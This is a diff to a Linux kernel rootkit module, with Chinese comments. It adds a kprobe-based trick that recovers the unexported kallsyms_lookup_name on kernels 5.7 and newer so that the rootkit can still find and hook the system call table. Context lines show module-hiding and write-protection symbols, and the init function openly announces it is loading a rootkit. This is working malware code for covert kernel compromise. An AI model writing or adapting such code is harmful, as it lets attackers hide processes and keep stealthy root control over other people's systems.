@@ -73,11 +73,46 @@ EXPORT_SYMBOL(enable_write_protection);
 EXPORT_SYMBOL(module_previous);
 EXPORT_SYMBOL(module_hidden);
 
+// 内核5.7+兼容的kallsyms_lookup_name获取方法
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+static unsigned long kln_addr = 0;
+static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
+static int init_kallsyms_lookup_name(void) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+    int ret;
+    ret = register_kprobe(&kp);
+    if (ret < 0) {
+        printk(KERN_ERR "[%s] register_kprobe failed, returned %d\n", MODULE_NAME, ret);
+        return ret;
+    }
+    kln_addr = (unsigned long) kp.addr;
+    unregister_kprobe(&kp);
+    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t) kln_addr;
+    printk(KERN_INFO "[%s] kallsyms_lookup_name address: 0x%lx\n", MODULE_NAME, kln_addr);
+#endif
+    return 0;
+}
+#endif
+
 // 查找系统调用表
 static unsigned long *find_sys_call_table(void) {
     unsigned long *syscall_table;
     
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+    if (kallsyms_lookup_name_ptr) {
+        syscall_table = (unsigned long*)kallsyms_lookup_name_ptr("sys_call_table");
+    } else {
+        printk(KERN_ERR "[%s] kallsyms_lookup_name not available\n", MODULE_NAME);
+        return NULL;
+    }
+#elif LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
     syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 #else
     unsigned long int i;
@@ -330,6 +365,14 @@ static const struct proc_ops proc_fops = {
 // 模块初始化
 static int __init rootkit_init(void) {
     printk(KERN_INFO "[%s] Loading rootkit module...\n", MODULE_NAME);
+    
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+    // 初始化kallsyms_lookup_name指针
+    if (init_kallsyms_lookup_name() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize kallsyms_lookup_name\n", MODULE_NAME);
+        return -1;
+    }
+#endif
     
     // 查找系统调用表
     sys_call_table = find_sys_call_table();
